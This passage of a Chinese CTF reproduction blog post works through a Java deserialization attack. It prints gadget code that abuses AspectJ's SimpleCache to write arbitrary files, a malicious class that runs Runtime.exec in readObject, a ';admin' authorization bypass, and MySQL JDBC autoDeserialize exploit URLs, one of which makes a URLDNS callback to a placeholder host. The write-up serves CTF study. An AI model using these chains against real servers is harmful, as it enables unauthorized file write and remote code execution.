class="string">&quot;org.aspectj.weaver.tools.cache.SimpleCache$StoreableCachingMap&quot;</span>);</span><br><span class="line">        Object simpleCache = ctor.newInstance(<span class="string">&quot;.&quot;</span>, <span class="number">12</span>);</span><br><span class="line"></span><br><span class="line">        HashMap wrapperMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        wrapperMap.put(filename,content);</span><br><span class="line">        DataMap dataMap = <span class="keyword">new</span> DataMap(wrapperMap, (Map)simpleCache);</span><br><span class="line">        Constructor Entryctor = Reflections.getFirstCtor(<span class="string">&quot;checker.DataMap$Entry&quot;</span>);</span><br><span class="line">        Reflections.setAccessible(Entryctor);</span><br><span class="line">        Object entry = Entryctor.newInstance(dataMap, filename);</span><br><span class="line"></span><br><span class="line">        HashSet map = <span class="keyword">new</span> HashSet(<span class="number">1</span>);</span><br><span class="line">        map.add(<span class="string">&quot;foo&quot;</span>);</span><br><span class="line">        Field f = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            f = HashSet.class.getDeclaredField(<span class="string">&quot;map&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchFieldException e) &#123;</span><br><span class="line">            f = HashSet.class.getDeclaredField(<span class="string">&quot;backingMap&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Reflections.setAccessible(f);</span><br><span class="line">        HashMap innimpl = (HashMap) f.get(map);</span><br><span class="line"></span><br><span class="line">        Field f2 = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            f2 = HashMap.class.getDeclaredField(<span class="string">&quot;table&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchFieldException e) &#123;</span><br><span class="line">            f2 = HashMap.class.getDeclaredField(<span class="string">&quot;elementData&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Reflections.setAccessible(f2);</span><br><span class="line">        Object[] array = (Object[]) f2.get(innimpl);</span><br><span class="line"></span><br><span class="line">        Object node = array[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">if</span>(node == <span class="keyword">null</span>)&#123;</span><br><span class="line">            node = array[<span class="number">1</span>];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Field keyField = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            keyField = node.getClass().getDeclaredField(<span class="string">&quot;key&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            keyField = Class.forName(<span class="string">&quot;java.util.MapEntry&quot;</span>).getDeclaredField(<span class="string">&quot;key&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Reflections.setAccessible(keyField);</span><br><span class="line">        keyField.set(node, entry);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> map;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        args = <span class="keyword">new</span> String[]&#123;<span class="string">&quot;bbb.txt;YWhpaGloaQ==&quot;</span>&#125;;</span><br><span class="line">        PayloadRunner.run(Antictf.class, args);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>将DataMap类导入yso工具中，将原有链中的中间部分通过DataMap类中代替最后调用put方法，调用链如下</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">HashSet.readObject()</span><br><span class="line">    HashMap.put()</span><br><span class="line">        HashMap.hash()</span><br><span class="line">            DataMap$Entry.hashcode</span><br><span class="line">                DataMap$Entry.getValue()</span><br><span class="line">                    DataMap.get()</span><br><span class="line">                        SimpleCache$StorableCachingMap.put()</span><br><span class="line">                            SimpleCache$StorableCachingMap.writeToPath()</span><br><span class="line">                                FileOutputStream.write()</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/06/29/non-rce-ctf%E5%A4%8D%E7%8E%B0/10.png" alt="10"></p>
+<h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><p>1.访问127.0.0.1/;admin进行绕过<br>2.利用mysqljdbc的反序列化漏洞，通过条件竞争绕过黑名单，在本地测试的时候我修改代码了省了这一步。<br>3.通过apectjweaver的链实现文件上传加载恶意类反序列换反弹shell。</p>
+<p>编写poc类，编译成class文件，最后base64一下，将poc,class写入目标服务器。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> servlet; </span><br><span class="line"><span class="keyword">import</span> java.io.*; </span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">poc</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123; </span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">writeObject</span><span class="params">(ObjectInputStream out)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">        out.defaultReadObject(); </span><br><span class="line">&#125; </span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(ObjectInputStream in)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123; </span><br><span class="line">        in.defaultReadObject(); </span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;1.txt&quot;</span>); &#125; &#125;</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/06/29/non-rce-ctf%E5%A4%8D%E7%8E%B0/11.png" alt="11"></p>
+<p><img src="/2021/06/29/non-rce-ctf%E5%A4%8D%E7%8E%B0/12.png" alt="12"></p>
+<p>上传文件poc.class，再配合jdbc反序列化。发送一个恶意类过去。这时候就会在classpath里找对应的class，触发重写的readobject。执行里面的恶意代码。</p>
+<p><a target="_blank" rel="noopener" href="http://127.0.0.1:8888/;admin/importData?databaseType=mysql&amp;jdbcUrl=jdbc:mysql://localhost:3306/test%EF%BC%9FautoDeserialize=true&amp;statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&amp;user=Antictf">http://127.0.0.1:8888/;admin/importData?databaseType=mysql&amp;jdbcUrl=jdbc:mysql://localhost:3306/test？autoDeserialize=true&amp;statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&amp;user=Antictf</a> 成功写入文件</p>
+<p>测试时在config.json中加入新的paylaod名称时字典里面掉了一个逗号导致一直报错，耽误不少时间</p>
+<p>最后一步可通过两种方式实现RCE</p>
+<p>1、反序列化加载恶意类。第一次反序列化的时候写入恶意类，第二次反序列化的时候反序列化该恶意类，可以执行该恶意类的readObject方法。</p>
+<p>2、业务中使用class.forName，且类参数可控。比如 jdbc:mysql://x.x.x.x:3307/test?autoDeserialize5=true&amp;statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&amp;user=yso_URLDNS_<a target="_blank" rel="noopener" href="http://x.x.x.x/">http://x.x.x.x</a> statementInterceptors参数传入的就是一个类名，且会被传入forName方法中。</p>
+<p>因为系统重装最后把环境整没了，没完整复现完但是挺有意思的学到很多东西。</p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/java/" rel="tag"># java</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2021/04/19/cc5%E9%93%BE/" rel="prev" title="cc5链">
+                  <i class="fa fa-chevron-left"></i> cc5链
+                </a>
+            </div>
+            <div class="post-nav-item">
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+      
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      const activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      const commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+    </div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+      
+
+      
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">热爱篮球和安全的小伙子</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/pisces/" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a>
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <script src="//cdn.jsdelivr.net/npm/animejs@3.2.1/lib/anime.min.js"></script>
+<script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
